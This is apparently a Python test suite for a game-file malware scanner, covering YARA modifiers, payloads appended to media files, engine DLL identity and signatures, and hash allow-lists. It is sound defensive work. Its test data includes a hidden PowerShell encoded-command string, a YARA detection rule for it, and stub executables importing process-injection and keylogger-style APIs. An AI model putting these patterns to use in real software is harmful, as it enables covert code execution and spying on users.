def build_dll(name, exports, imports=("ExitProcess",), dll=True, section=b".text"):
    """A well-formed PE32 with an export table: it calls itself ``name`` and
    exports ``exports`` (and imports ``imports`` from kernel32)."""
    pe = bytearray(build_pe(imports if isinstance(imports, dict) else list(imports),
                            section=section))
    raw_ptr, rva = 0x200, 0x1000
    body_len = len(pe) - raw_ptr
    names = sorted(exports)
    table = bytearray(40)
    functions = len(table)
    table += b"\0" * (4 * len(names))
    name_pointers = len(table)
    table += b"\0" * (4 * len(names))
    ordinals = len(table)
    table += b"".join(struct.pack("<H", i) for i in range(len(names)))
    own = len(table)
    table += name.encode() + b"\0"
    base = rva + body_len
    for i, export in enumerate(names):
        struct.pack_into("<I", table, functions + 4 * i, rva)
        struct.pack_into("<I", table, name_pointers + 4 * i, base + len(table))
        table += export.encode() + b"\0"
    struct.pack_into("<IIHHIIIIIII", table, 0, 0, 0, 0, 0, base + own, 1, len(names), len(names),
                     base + functions, base + name_pointers, base + ordinals)
    table += b"\0" * (-len(table) % 0x200)
    pe += table
    lfanew = struct.unpack_from("<I", pe, 0x3C)[0]
    optional = lfanew + 24
    struct.pack_into("<II", pe, optional + 96, base, len(table))            # export directory
    section_at = optional + struct.unpack_from("<H", pe, lfanew + 20)[0]
    struct.pack_into("<I", pe, section_at + 8, body_len + len(table))        # virtual size
    struct.pack_into("<I", pe, section_at + 16, body_len + len(table))       # raw size
    if dll:
        struct.pack_into("<H", pe, lfanew + 22, struct.unpack_from("<H", pe, lfanew + 22)[0] | 0x2000)
    return bytes(pe)


def build_il2cpp(literals, images, pinvoke=()):
    """A ``global-metadata.dat`` in the classic (offset, size) layout.
    ``images`` is ``{assembly name: {type name: [method names]}}``."""
    heap = bytearray(b"\0")

    def name(text):
        at = len(heap)
        heap.extend(text.encode() + b"\0")
        return at

    types, methods, image_rows = b"", b"", b""
    type_count = method_count = 0
    for image, members in images.items():
        image_rows += struct.pack("<IiiI", name(image), 0, type_count, len(members)) + b"\0" * 24
        for type_name, names in members.items():
            namespace, _dot, short = type_name.rpartition(".")
            row = bytearray(92)
            struct.pack_into("<II", row, 0, name(short), name(namespace) if namespace else 0)
            struct.pack_into("<I", row, 40, method_count)                 # first method
            struct.pack_into("<H", row, 72, len(names))                   # method count
            types += bytes(row)
            for method in names:
                flags = 0x2006 if method in pinvoke else 0x0006
                methods += struct.pack("<IIIIIIHHHH", name(method), type_count, 0, 0, 0, 0,
                                       flags, 0, 0, 0)
                method_count += 1
            type_count += 1
    data = b"".join(s.encode() for s in literals)
    table, at = b"", 0
    for s in literals:
        table += struct.pack("<II", len(s.encode()), at)
        at += len(s.encode())
    blocks = {0: table, 1: data, 2: bytes(heap), 5: methods, 19: types, 20: image_rows}
    count = 30
    header_size = 8 + 8 * count
    body, pairs = b"", []
    for index in range(count):
        block = blocks.get(index, b"")
        pairs.append((header_size + len(body), len(block)))
        body += block + b"\0" * (-len(block) % 4)
    return (b"\xaf\x1b\xb1\xfa" + struct.pack("<i", 24)
            + b"".join(struct.pack("<II", *p) for p in pairs) + body)


class SecretStorageTests(unittest.TestCase):
    """API keys are not written to disk in plain text."""

    def setUp(self):
        from gamescan import settings
        self.settings = settings
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(__import__("shutil").rmtree, self.tmp, True)
        old = (settings.DIR, settings.PATH)
        settings.DIR, settings.PATH = self.tmp, os.path.join(self.tmp, "settings.json")
        self.addCleanup(lambda: setattr(settings, "DIR", old[0]) or setattr(settings, "PATH", old[1]))

    def raw(self):
        with open(self.settings.PATH, encoding="utf-8") as fh:
            return fh.read()

    def test_keys_are_encrypted_on_disk_and_plain_in_memory(self):
        from gamescan import secrets_store
        self.settings.update(vt_api_key="VT-SECRET-0123456789", abusech_key="ABUSE-SECRET-42",
                             vt_enabled=True)
        text = self.raw()
        loaded = self.settings.load()
        self.assertEqual((loaded["vt_api_key"], loaded["abusech_key"], loaded["vt_enabled"]),
                         ("VT-SECRET-0123456789", "ABUSE-SECRET-42", True))
        if not secrets_store.available():
            self.assertEqual(os.stat(self.settings.PATH).st_mode & 0o077, 0, "owner-only file")
            return
        self.assertNotIn("VT-SECRET", text)
        self.assertNotIn("ABUSE-SECRET", text)
        stored = json.loads(text)
        self.assertTrue(stored["vt_api_key"].startswith("dpapi:"))
        self.assertNotEqual(stored["vt_api_key"], stored["abusech_key"])
        # a value that was tampered with, or comes from another account, opens as nothing
        self.assertEqual(secrets_store.reveal(stored["vt_api_key"][:-6] + "AAAA=="), "")
        self.assertEqual(secrets_store.reveal("dpapi:not base64 !"), "")
        self.assertEqual(secrets_store.reveal(secrets_store.protect("")), "")

    def test_a_plain_text_key_from_an_earlier_version_is_protected_on_first_load(self):
        from gamescan import secrets_store
        with open(self.settings.PATH, "w", encoding="utf-8") as fh:
            json.dump({"vt_api_key": "OLD-PLAIN-KEY", "vt_max_lookups": 7}, fh)
        loaded = self.settings.load()
        self.assertEqual((loaded["vt_api_key"], loaded["vt_max_lookups"]), ("OLD-PLAIN-KEY", 7))
        if secrets_store.available():
            self.assertNotIn("OLD-PLAIN-KEY", self.raw(), "rewritten without the plain text")
            self.assertEqual(self.settings.load()["vt_api_key"], "OLD-PLAIN-KEY")
        self.assertFalse(os.path.exists(self.settings.PATH + ".tmp"))


class YaraModifierTests(unittest.TestCase):
    """The xor and base64 string modifiers of the built-in YARA engine."""

    RULES = '''
        rule Xor      { strings: $a = "powershell -enc" xor condition: $a }
        rule XorRange { strings: $a = "powershell -enc" xor(0x01-0xff) ascii wide condition: $a }
        rule XorWord  { strings: $a = "calc" xor fullword condition: $a }
        rule B64      { strings: $a = "This program cannot" base64 condition: $a }
        rule B64Wide  { strings: $a = "VirtualAlloc" base64wide condition: $a }
        rule B64Alpha { strings: $a = "VirtualAlloc"
                        base64("ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210-_")
                        condition: $a }
        rule Both     { strings: $a = "abc" xor base64 condition: $a }
        rule NoCase   { strings: $a = "abc" xor nocase condition: $a }
        rule HexXor   { strings: $a = { 41 42 43 } xor condition: $a }
        rule Count    { strings: $a = "MARK" xor condition: #a == 3 }
    '''

    def names(self, data):
        from gamescan import yara
        rules = yara.YaraRuleSet()
        rules.add_source(self.RULES)
        self.skipped = dict(rules.skipped)
        return sorted(m.rule.name for m in rules.match(data))

    def test_xor(self):
        text = b"powershell -enc"
        self.assertEqual(self.names(os.urandom(64) + text), ["Xor"], "key 0 is the plain string")
        for key in (0x01, 0x5A, 0xFF):
            hidden = os.urandom(64) + bytes(b ^ key for b in text) + os.urandom(64)
            self.assertEqual(self.names(hidden), ["Xor", "XorRange"], key)
        wide = b"".join(bytes((b, 0)) for b in text)
        self.assertEqual(self.names(bytes(b ^ 0x17 for b in wide)), ["XorRange"])
        self.assertEqual(self.names(bytes(b ^ 9 for b in b" calc ")), ["XorWord"])
        self.assertEqual(self.names(bytes(b ^ 9 for b in b"xcalcx")), [])
        self.assertEqual(self.names(b"".join(bytes(b ^ k for b in b"MARK") + b"--" for k in (1, 2, 3))),
                         ["Count"])
        self.assertEqual(self.names(b"nothing here"), [])

    def test_base64(self):
        std = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        for lead in (b"", b"A", b"AB"):                      # the three alignments
            packed = base64.b64encode(lead + b"xx This program cannot be run !!")
            self.assertEqual(self.names(b"<" + packed + b">"), ["B64"], lead)
        self.assertEqual(self.names(base64.b64encode(b"This program can")), [])
        packed = base64.b64encode(b"..VirtualAlloc..")
        self.assertEqual(self.names(packed.decode().encode("utf-16-le")), ["B64Wide"])
        custom = packed.translate(bytes.maketrans(
            std, b"ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210-_"))
        self.assertEqual(self.names(custom), ["B64Alpha"])

    def test_unsupported_combinations_are_skipped_not_passed(self):
        self.names(b"")
        self.assertEqual(sorted(self.skipped), ["Both", "HexXor", "NoCase"])
        self.assertIn("cannot be combined", self.skipped["Both"])

    def test_through_the_scanner(self):
        from gamescan import yara
        from gamescan.rules import RuleEngine
        rules = RuleEngine()
        rules.yara.add_source('rule HiddenLoader { meta: severity = "HIGH" strings: '
                              '$a = "powershell -enc" xor(1-255) condition: $a }')
        found = Scanner(rules=rules).scan_bytes(
            "data/blob.bin", os.urandom(200) + bytes(b ^ 0x42 for b in b"powershell -enc AAAA"))
        self.assertTrue([f for f in active(found) if "HiddenLoader" in f.title + f.evidence + f.rule_id])
        del yara


class MoreMediaFormatTests(unittest.TestCase):
    """MP3, MIDI and Matroska / WebM are walked by their structure."""

    COMMAND = b"cmd.exe /c powershell -nop -w hidden -enc AAAA"
    PE = build_pe(["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
                   "ExitProcess", "Sleep", "CloseHandle"])

    @staticmethod
    def mp3(frames=5, tag=b""):
        frame = b"\xff\xfb\x90\x00" + b"\x55" * 413          # MPEG-1 layer III, 128 kbit/s, 44.1 kHz
        out = b""
        if tag is not None:
            size = len(tag)
            out = b"ID3\x03\x00\x00" + bytes([size >> 21 & 127, size >> 14 & 127, size >> 7 & 127,
                                               size & 127]) + tag
        return out + frame * frames

    @staticmethod
    def midi(tracks=2):
        track = b"\x00\xff\x03\x05Piano\x00\x90\x3c\x40\x60\x80\x3c\x40\x00\xff\x2f\x00"
        return b"MThd" + struct.pack(">IHHH", 6, 1, tracks, 96) + \
            (b"MTrk" + struct.pack(">I", len(track)) + track) * tracks

    @staticmethod
    def webm(tags=b"", unknown_size=False):
        def full(ident, body):
            if len(body) < 127:
                size = bytes([0x80 | len(body)])
            else:
                size = struct.pack(">H", 0x4000 | len(body))
            return ident + size + body
        info = full(b"\x15\x49\xa9\x66", b"\x4d\x80\x84test")
        cluster = full(b"\x1f\x43\xb6\x75", b"\xe7\x81\x00" + bytes(range(128, 228)))
        tag = full(b"\x12\x54\xc3\x67", tags) if tags else b""
        body = info + tag + cluster
        head = full(b"\x1a\x45\xdf\xa3", b"\x42\x82\x84webm")
        segment = b"\x18\x53\x80\x67" + (b"\x01\xff\xff\xff\xff\xff\xff\xff" if unknown_size
                                           else struct.pack(">H", 0x4000 | len(body)))
        return head + segment + body

    def test_boundaries(self):
        from gamescan.unpack import media
        cases = {"MP3 audio": self.mp3(), "MIDI music": self.midi(),
                 "Matroska / WebM video": self.webm()}
        for kind, body in cases.items():
            info = media.parse(body)
            self.assertEqual((info.kind, info.end, info.problem), (kind, len(body), ""), kind)
            self.assertEqual(media.parse(body + b"EXTRA DATA").end, len(body), kind)
        self.assertEqual(media.parse(self.webm(unknown_size=True) + b"\x00\x00tail").end,
                         len(self.webm(unknown_size=True)))
        bare = self.mp3(tag=None)                             # no ID3 tag at all
        self.assertEqual(media.parse(bare + b"junk").end, len(bare))
        tagged = self.mp3() + b"TAG" + b"\0" * 125            # ID3v1 belongs to the file
        self.assertEqual(media.parse(tagged).end, len(tagged))
        ape = b"APETAGEX" + struct.pack("<IIII", 2000, 32, 0, 0xA0000000) + b"\0" * 8 \
            + b"APETAGEX" + struct.pack("<IIII", 2000, 32, 0, 0x80000000) + b"\0" * 8
        self.assertEqual(media.parse(self.mp3() + ape).end, len(self.mp3()) + len(ape))
        short = media.parse(self.midi()[:-4])
        self.assertIn("cut short", short.problem)
        missing = media.parse(self.midi(tracks=2)[:14 + 27] + b"JUNKJUNK")
        self.assertIn("track 2 of 2 is missing", missing.problem)
        self.assertIsNone(media.parse(b"\xff\xfb\x90\x00" + b"\0" * 50), "one frame is not an MP3")

    def test_payloads_behind_and_inside(self):
        s = Scanner()
        for name, body in (("bgm.mp3", self.mp3()), ("bgm.mid", self.midi()),
                           ("movie.webm", self.webm())):
            self.assertEqual(s.scan_bytes("Audio/" + name, body), [], name)
            found = s.scan_bytes("Audio/" + name, body + self.PE)
            self.assertTrue(active(found, "MEDIA-002"), name)
            self.assertEqual(len(active([f for f in found if f.file.endswith("!appended.exe")],
                                        "INJ-001")), 3, name)
            junk = s.scan_bytes("Audio/" + name, body + bytes(range(128, 200)))
            self.assertEqual([f.rule_id for f in junk], ["MEDIA-001"], name)
        tag = s.scan_bytes("Audio/a.mp3", self.mp3(tag=b"TXXX" + b"\0" * 6 + self.COMMAND))
        self.assertTrue(active(tag, "LOL-001"), "text in the ID3 tag is read")
        tags = s.scan_bytes("Movies/a.webm", self.webm(tags=b"\x80" * 4 + self.COMMAND))
        self.assertTrue(active(tags, "LOL-001"), "text in the Matroska tags is read")
        text = s.scan_bytes("Audio/a.mid", self.midi().replace(b"Piano", b"calc!") + b"")
        self.assertEqual(text, [])


class EngineFileStructureTests(unittest.TestCase):
    """A name alone does not make a file an engine component."""

    DANGER = ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "ExitProcess",
              "Sleep", "CloseHandle"]

    def test_export_table_helper(self):
        pe = parse_pe(build_dll("steam_api.dll", ["SteamAPI_Init", "SteamAPI_Shutdown"]))
        self.assertEqual((pe.export_name, pe.is_dll), ("steam_api.dll", True))
        self.assertEqual(pe.exports, {"SteamAPI_Init", "SteamAPI_Shutdown"})

    def test_a_library_must_be_built_like_the_component_it_is_named_after(self):
        vendor_signature(self, False)                    # the structural check on its own
        s = Scanner()
        real = build_dll("steam_api.dll", ["SteamAPI_Init", "SteamAPI_RunCallbacks"], self.DANGER)
        found = s.scan_bytes("steam_api.dll", real)
        self.assertTrue(found and not active(found), "name, identity and exports fit")
        self.assertIn("common game middleware library", found[0].suppression_reason)
        cases = {
            "no exports at all": build_pe(self.DANGER),
            "calls itself something else": build_dll("payload.dll", ["SteamAPI_Init"], self.DANGER),
            "does not export what Steam's library exports": build_dll("steam_api.dll", ["Run"],
                                                                      self.DANGER),
            "packed": build_dll("steam_api.dll", ["SteamAPI_Init"], self.DANGER, section=b"UPX0"),
        }
        for why, data in cases.items():
            found = s.scan_bytes("steam_api.dll", data)
            self.assertEqual(len(active(found, "INJ-001")), 3, why)
            note = active(found, "ENGINE-001")
            self.assertEqual((len(note), note[0].severity), (1, Severity.MEDIUM), why)
        self.assertIn("calls itself payload.dll", active(
            s.scan_bytes("steam_api.dll", cases["calls itself something else"]), "ENGINE-001")[0].evidence)
        other = s.scan_bytes("helper.dll", cases["no exports at all"])
        self.assertFalse([f for f in other if f.rule_id == "ENGINE-001"], "no claim, no mismatch")

    def test_correct_structure_is_not_enough_without_the_vendors_signature(self):
        s = Scanner()
        fake = build_dll("steam_api.dll", ["SteamAPI_Init", "SteamAPI_RunCallbacks"], self.DANGER)
        signed_as(self, None)
        found = s.scan_bytes("steam_api.dll", fake)
        self.assertEqual(len(active(found, "INJ-001")), 3, "a perfect imitation is still scanned")
        note = active(found, "ENGINE-002")
        self.assertEqual((len(note), note[0].severity, note[0].chainable), (1, Severity.LOW, False))
        self.assertIn("signed by Valve", note[0].evidence)
        self.assertFalse(active(found, "ENGINE-001"), "its structure is not what is wrong with it")
        harmless = s.scan_bytes("steam_api.dll", build_dll("steam_api.dll", ["SteamAPI_Init"], PLAIN_IMPORTS))
        self.assertFalse(active(harmless, "ENGINE-002"), "no findings, nothing to explain")

        signed_as(self, "Totally Legit Software Ltd")
        other = s.scan_bytes("steam_api.dll", fake)
        self.assertEqual(len(active(other, "INJ-001")), 3, "somebody else's signature does not count")
        self.assertIn('signed by "Totally Legit Software Ltd", not by Valve',
                      active(other, "ENGINE-001")[0].evidence)
        signed_as(self, "Valve Corp.")
        genuine = s.scan_bytes("steam_api.dll", fake)
        self.assertTrue(genuine and not active(genuine), "Valve's signature exempts")
        signed_as(self, "Valvewares Inc")
        self.assertEqual(len(active(s.scan_bytes("steam_api.dll", fake), "INJ-001")), 3,
                         "a name that merely begins like the vendor's")
        signed_as(self, "Unity Technologies ApS")
        unity = build_dll("UnityPlayer.dll", ["UnityMain"], self.DANGER)
        self.assertFalse(active(s.scan_bytes("UnityPlayer.dll", unity)))
        self.assertEqual(len(active(s.scan_bytes("steam_api64.dll", build_dll(
            "steam_api64.dll", ["SteamAPI_Init"], self.DANGER)), "INJ-001")), 3,
            "Unity's signature proves nothing about Steam's library")
        # components nobody signs cannot be proven genuine at all
        signed_as(self, None)
        python = s.scan_bytes("python27.dll", build_dll("python27.dll", ["Py_Initialize"], self.DANGER))
        self.assertEqual(len(active(python, "INJ-001")), 3)
        self.assertIn("not distributed with a vendor signature", active(python, "ENGINE-002")[0].evidence)

    def test_vendor_signature_of_real_files(self):
        from gamescan.handlers import engine_files
        from gamescan.models import FileContext
        player = os.path.join(SAMPLES, "UNITY-01", "UnityPlayer.dll")   # no Unity sample at present
        if not os.path.isfile(player):
            self.skipTest("not on this PC: " + player)
        with open(player, "rb") as fh:
            data = fh.read()
        ctx = FileContext(path=player, relpath="UnityPlayer.dll", data=data, size=len(data),
                          sha256="0" * 64)
        ctx.pe = parse_pe(data)
        self.assertEqual(engine_files.expected_vendors(ctx), ("Unity Technologies",))
        self.assertTrue(engine_files.signer(ctx).startswith("Unity Technologies"))
        self.assertEqual(engine_files.binary(ctx, "Unity player runtime"), "")
        # the same bytes with the signature damaged: Windows no longer vouches for them
        broken = bytearray(data)
        broken[len(broken) // 2] ^= 0xFF
        with tempfile.TemporaryDirectory() as tmp:
            copy = os.path.join(tmp, "UnityPlayer.dll")
            with open(copy, "wb") as fh:
                fh.write(broken)
            ctx = FileContext(path=copy, relpath="UnityPlayer.dll", data=bytes(broken),
                              size=len(broken), sha256="0" * 64)
            ctx.pe = parse_pe(bytes(broken))
            self.assertIsNone(engine_files.signer(ctx))
            self.assertIn("no valid signature", engine_files.binary(ctx, "Unity player runtime"))
            self.assertIn("engine_unsigned", ctx.cache)

    def test_other_components(self):
        vendor_signature(self, False)
        s = Scanner()
        ok = {"UnityPlayer.dll": ["UnityMain"], "python27.dll": ["Py_Initialize", "Py_Main"],
              "lib/windows-i686/_socket.pyd": ["init_socket"], "SDL2.dll": ["SDL_Init"],
              "ffmpeg.dll": ["av_buffer_create"], "MonoBleedingEdge/EmbedRuntime/mono-2.0-bdwgc.dll":
              ["mono_jit_init"]}
        for path, exports in ok.items():
            leaf = path.rsplit("/", 1)[-1]
            found = s.scan_bytes(path, build_dll(leaf, exports, self.DANGER))
            self.assertTrue(found and not active(found), path)
            fake = s.scan_bytes(path, build_dll(leaf, ["DllMain"], self.DANGER))
            self.assertEqual(len(active(fake, "INJ-001")), 3, path)
        launcher = build_pe(self.DANGER)                      # imports kernel32 only
        found = s.scan_bytes("lib/windows-i686/python.exe", launcher)
        self.assertEqual(len(active(found, "INJ-001")), 3, "python.exe that does not load Python")
        self.assertTrue(active(found, "ENGINE-001"))
        tool = s.scan_bytes("lib/windows-i686/zsync.exe", launcher)
        self.assertEqual(len(active(tool, "INJ-001")), 3, "the folder alone is not trusted either")
        self.assertFalse(active(tool, "ENGINE-001"), "but it claims to be nothing in particular")

    def test_framework_assembly_must_be_an_assembly(self):
        native = build_pe(self.DANGER)
        found = Scanner().scan_bytes("Game_Data/Managed/UnityEngine.CoreModule.dll", native)
        self.assertEqual(len(active(found, "INJ-001")), 3)
        note = active(found, "ENGINE-001")
        self.assertIn("not a .NET assembly", note[0].evidence)

    def test_default_scripts_must_be_what_their_name_says(self):
        s = Scanner()
        table = RgssTests().scripts_file([
            ("Game_Temp", "class Game_Temp\n  def run(c)\n    eval(c)\n  end\nend\n"),
            ("Game_Party", "def helper(c)\n  eval(c)\nend\n"),
            ("Vocab", "module Vocab\n  X = eval('1')\nend\n"),
            ("Main", "x = eval(code)\n"),
            ("Main", "rgss_main { SceneManager.run }\nx = eval(code)\n")])
        found = s.scan_bytes("Data/Scripts.rvdata2", table)
        by_file = {}
        for f in found:
            by_file.setdefault(f.file.rsplit("!", 1)[-1], []).append(f)
        self.assertFalse(active(by_file["001_Game_Temp.rb"]))
        self.assertFalse(active(by_file["003_Vocab.rb"]))
        self.assertFalse(active(by_file["005_Main.rb"]))
        self.assertTrue(active(by_file["002_Game_Party.rb"], "RB-EXEC-001"),
                        "a script that only borrows a stock name is judged normally")
        self.assertEqual(active(by_file["002_Game_Party.rb"], "ENGINE-001")[0].severity, Severity.LOW)
        self.assertTrue(active(by_file["004_Main.rb"], "RB-EXEC-001"))
        fake_lib = s.scan_bytes("js/libs/lz-string.js", b"var x = eval(src);\n")
        self.assertTrue(active(fake_lib, "JS-EXEC-001"))
        self.assertTrue(active(fake_lib, "ENGINE-001"))
        real_lib = s.scan_bytes("js/libs/lz-string.js", b"var LZString = {}; var x = eval(src);\n")
        self.assertFalse(active(real_lib))

    def test_members_of_a_signed_file_inherit_its_signature(self):
        from gamescan.context import SIGNED_BY_TRUSTED
        from gamescan.models import FileContext
        scanner = Scanner()
        inner = build_pe(self.DANGER)
        ctx = FileContext(path="x", relpath="setup.exe!tool.dll", data=inner, size=len(inner),
                          sha256="0" * 64)
        ctx.cache["signed_container"] = "%s: Example Corp" % SIGNED_BY_TRUSTED
        found = scanner._scan_ctx(ctx, depth=1)
        self.assertTrue(found and not active(found))
        strict = Scanner(strict=True)
        ctx = FileContext(path="x", relpath="setup.exe!tool.dll", data=inner, size=len(inner),
                          sha256="0" * 64)
        ctx.cache["signed_container"] = "%s: Example Corp" % SIGNED_BY_TRUSTED
        self.assertEqual(len(active(strict._scan_ctx(ctx, depth=1), "INJ-001")), 3)

    @slow
    def test_real_engine_files_fit_their_names(self):
        seen = 0
        # UNITY-01: no Unity sample at present
        for folder in (os.path.join(SAMPLES, "UNITY-01"), os.path.join(SAMPLES, "MV-01")):
            if not os.path.isdir(folder):
                continue
            seen += 1
            files = [os.path.join(base, name) for base, _dirs, names in os.walk(folder)
                     for name in names if name.lower().endswith((".dll", ".exe", ".pyd"))
                     or (name.lower().endswith(".js") and os.sep + "js" in base.lower()
                         and "plugins" not in base.lower())]
            self.assertGreater(len(files), 10)
            report = Scanner(memory=False).scan(files)
            self.assertFalse([f.file for f in report.findings if f.rule_id == "ENGINE-001"], folder)
            self.assertTrue([f for f in report.findings
                             if f.suppression_reason.startswith("Engine / library baseline")], folder)
        if not seen:
            self.skipTest("the real games are not on this PC")


class EngineHashTests(unittest.TestCase):
    """Engine files nobody signs are accepted by the SHA-256 of an official
    build - and by nothing else (not by their name, not by their structure)."""

    DANGER = EngineFileStructureTests.DANGER
    RUN_KEY = b"Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"

    def official(self, data, name="nw.dll"):
        """Enter ``data`` in the table as if an official archive contained it."""
        import hashlib
        from gamescan import engine_hashes
        digest = hashlib.sha256(data).hexdigest()
        self.addCleanup(engine_hashes.KNOWN.pop, digest, None)
        engine_hashes.KNOWN[digest] = (name, 0)
        return digest

    def test_file_matching_the_table_is_accepted(self):
        data = build_dll("nw.dll", ["x"], self.DANGER)
        self.assertEqual(len(active(Scanner().scan_bytes("nw.dll", data), "INJ-001")), 3,
                         "not in the table: judged like any unknown program")
        self.official(data)
        found = Scanner().scan_bytes("nw.dll", data)
        self.assertTrue(found and not active(found))
        self.assertIn("official engine build, verified by SHA-256: nw.dll - NW.js 0.29.0",
                      found[0].suppression_reason)

    def test_one_changed_byte_is_not_accepted(self):
        data = build_dll("nw.dll", ["x"], self.DANGER)
        self.official(data)
        changed = bytearray(data)
        changed[-1] ^= 0x01
        found = Scanner().scan_bytes("nw.dll", bytes(changed))
        self.assertEqual(len(active(found, "INJ-001")), 3)
        self.assertFalse([f for f in found if "verified by SHA-256" in f.suppression_reason])

    def test_another_library_named_nw_dll_is_not_accepted(self):
        self.official(build_dll("nw.dll", ["x"], self.DANGER))
        other = build_dll("payload.dll", ["Run"], self.DANGER + ["GetTickCount"])
        found = Scanner().scan_bytes("nw.dll", other)
        self.assertEqual(len(active(found, "INJ-001")), 3)
        self.assertFalse([f for f in found if "verified by SHA-256" in f.suppression_reason])

    def test_the_check_is_by_content_not_by_name(self):
        launcher = build_pe(self.DANGER)
        self.assertEqual(len(active(Scanner().scan_bytes("Game.exe", launcher), "INJ-001")), 3)
        self.official(launcher, "nw.exe")
        for name in ("Game.exe", "bin/renamed again.exe"):
            found = Scanner().scan_bytes(name, launcher)
            self.assertTrue(found and not active(found), name)
            self.assertIn("nw.exe - NW.js", found[0].suppression_reason)

    def test_strict_mode_ignores_the_table(self):
        data = build_dll("nw.dll", ["x"], self.DANGER)
        self.official(data)
        self.assertEqual(len(active(Scanner(strict=True).scan_bytes("nw.dll", data), "INJ-001")), 3)

    def test_chain_inside_a_verified_file_is_shown_as_a_low_note(self):
        from gamescan import i18n
        data = build_pe(["CreateRemoteThread", "ExitProcess", "Sleep", "CloseHandle",
                         "GetLastError", "HeapAlloc"], strings=self.RUN_KEY)
        before = active(Scanner().scan_bytes("Game.exe", data), "CHAIN-BACKDOOR")
        self.assertEqual([f.severity for f in before], [Severity.HIGH])
        self.official(data, "nw.exe")
        found = Scanner().scan_bytes("Game.exe", data)
        chain = active(found, "CHAIN-BACKDOOR")
        self.assertEqual([f.severity for f in chain], [Severity.LOW], "still visible, as a note")
        self.assertIn("verified official build", chain[0].reason)
        self.assertEqual(active(found), chain, "its parts are suppressed like any baseline finding")
        i18n.set_language("tr")
        self.addCleanup(i18n.set_language, "en")
        self.assertIn("doğrulanmış resmi sürümünün", i18n.reason(chain[0]))
        self.assertIn("SHA-256 ile doğrulandı", i18n.suppression(suppressed(found)[0]))
        i18n.set_language("en")
        strict = active(Scanner(strict=True).scan_bytes("Game.exe", data), "CHAIN-BACKDOOR")
        self.assertEqual([f.severity for f in strict], [Severity.HIGH], "strict mode: unchanged")

    def test_critical_findings_in_a_verified_file_are_unchanged(self):
        # (a hook and the network alone are HIGH in a program since 2026-10-05; the table
        # of key names is the second strong sign that makes it CRITICAL)
        data = build_pe(["SetWindowsHookExA", "URLDownloadToFileA", "ExitProcess", "Sleep",
                         "CloseHandle", "GetLastError"],
                        strings=b"[ENTER]\0[BACKSPACE]\0[TAB]\0[SHIFT]\0[CTRL]\0[ESC]\0")
        before = active(Scanner().scan_bytes("Game.exe", data), "CHAIN-SPYWARE")
        self.assertEqual([f.severity for f in before], [Severity.CRITICAL])
        self.official(data, "nw.exe")
        found = Scanner().scan_bytes("Game.exe", data)
        chain = active(found, "CHAIN-SPYWARE")
        self.assertEqual([f.severity for f in chain], [Severity.CRITICAL])
        self.assertNotIn("verified official build", chain[0].reason)

    def test_a_trusted_signature_still_comes_first_and_members_share_the_verdict(self):
        from gamescan import engine_hashes
        from gamescan.context import SIGNED_BY_TRUSTED
        from gamescan.models import FileContext
        data = build_pe(self.DANGER, signed=True)
        self.official(data, "dxwebsetup.exe")
        signed_as(self, "Microsoft Corporation")
        found = Scanner().scan_bytes("lib/dxwebsetup.exe", data)
        self.assertTrue(found and not active(found))
        self.assertIn(SIGNED_BY_TRUSTED, found[0].suppression_reason,
                      "an official file that is also validly signed is judged by its signature")
        signed_as(self, None)
        found = Scanner().scan_bytes("lib/dxwebsetup.exe", data)
        self.assertIn("verified by SHA-256", found[0].suppression_reason)
        # what is packed inside a verified official file is part of that file
        inner = build_pe(["CreateRemoteThread", "ExitProcess", "Sleep", "CloseHandle",
                          "GetLastError", "HeapAlloc"], strings=self.RUN_KEY)
        ctx = FileContext(path="x", relpath="setup.exe!tool.exe", data=inner, size=len(inner),
                          sha256="0" * 64)
        ctx.cache["signed_container"] = "%s: setup.exe - Ren'Py 7.3.5 (SDK)" % engine_hashes.VERIFIED
        found = Scanner()._scan_ctx(ctx, depth=1)
        self.assertEqual([(f.rule_id, f.severity) for f in active(found)],
                         [("CHAIN-BACKDOOR", Severity.LOW)])

    def test_table_entries_name_their_official_source(self):
        from gamescan import engine_hashes
        self.assertGreater(len(engine_hashes.KNOWN), 100)
        for engine, version, build, url, digest, _listed in engine_hashes.ARCHIVES:
            self.assertTrue(engine and version and build)
            self.assertTrue(url.startswith(("https://dl.nwjs.io/v%s/" % version,
                                            "https://www.renpy.org/dl/%s/" % version,
                                            "https://download.unity3d.com/download_unity/")), url)
            self.assertRegex(digest, r"\A[0-9a-f]{64}\Z")
        for digest, (name, index) in engine_hashes.KNOWN.items():
            self.assertRegex(digest, r"\A[0-9a-f]{64}\Z")
            # programs and libraries - and, of the NW.js archives, every file (2026-10-12)
            # - and, of the Ren'Py SDKs, the shell launcher (2026-10-12)
            if engine_hashes.ARCHIVES[index][0] != "NW.js" and \
                    (engine_hashes.ARCHIVES[index][0], name) != ("Ren'Py", "renpy.sh"):
                self.assertTrue(name.lower().endswith((".exe", ".dll", ".pyd")), name)
            self.assertIn(engine_hashes.ARCHIVES[index][1], engine_hashes.verified(digest))
            self.assertEqual(engine_hashes.source(digest.upper()), engine_hashes.ARCHIVES[index][3])
        self.assertIsNone(engine_hashes.verified("0" * 64))
        self.assertIsNone(engine_hashes.verified(""))

    def test_table_builder_hashes_programs_only_and_asks_official_servers_only(self):
        import hashlib
        import io
        import zipfile
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                                        "tools"))
        self.addCleanup(sys.path.pop, 0)
        import build_engine_hashes as tool
        program, library = build_pe(PLAIN_IMPORTS), build_dll("b.dll", ["x"], PLAIN_IMPORTS)
        archive = io.BytesIO()
        with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("pkg/nw.exe", program)
            z.writestr("pkg/sub/b.dll", library)
            z.writestr("pkg/not a program.dll", b"plain text")
            z.writestr("pkg/readme.txt", b"MZ but not named like a program")
        self.assertEqual(tool.hash_archive(archive), {
            hashlib.sha256(program).hexdigest(): "nw.exe",
            hashlib.sha256(library).hexdigest(): "b.dll"})
        # every file of the archive (NW.js; phageo, 2026-10-12): a program by its file name as
        # before, any other file by its path in the archive; empty files are left out
